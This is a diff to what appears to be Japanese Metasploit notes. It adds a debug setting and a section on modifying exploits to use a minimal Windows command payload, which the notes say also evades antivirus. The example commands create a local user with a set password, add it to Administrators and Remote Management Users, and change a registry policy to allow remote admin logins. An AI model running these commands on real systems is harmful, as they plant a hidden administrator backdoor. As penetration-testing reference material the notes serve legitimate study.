@@ -133,6 +133,12 @@ msf6 exploit(xxx) > exploit
 msf6 exploit(xxx) > exploit -z
 ```
 
+#### debug
+
+```sh
+set verbose true
+```
+
 ### モジュール構成
 
 ```shell
@@ -493,6 +499,37 @@ msf > use auxiliary/test/fooooo
 
 ```rb
 class MetasploitModule < Msf::Auxiliary
+```
+
+## generic ペイロード
+
+既存のエクスプロイトを改造して、ターゲットに対応するペイロードを変更するのが有効な場合がある。  
+最小限のコマンドにすることでAV回避にもなる。
+
+```rb
+  'Targets' => [
+    [
+      'Windows Command',
+      {
+        'Arch' => ARCH_CMD,
+        'Type' => :win_cmd,
+        'DefaultOptions' => {
+          'PAYLOAD' => 'cmd/windows/generic'
+        }
+      }
+    ],
+```
+
+### cmd/windows/generic
+
+実行例
+
+```ps
+msf exploit(test/foo) > set CMD net user bc100 Bc_@12345!!!!! /ADD
+msf exploit(test/foo) > set CMD net localgroup Administrators bc100 /ADD
+msf exploit(test/foo) > set CMD net localgroup \"Remote Management Users\" bc100 /ADD
+
+msf exploit(test/foo) > set CMD reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 ```
 
 ## セキュリティ視点
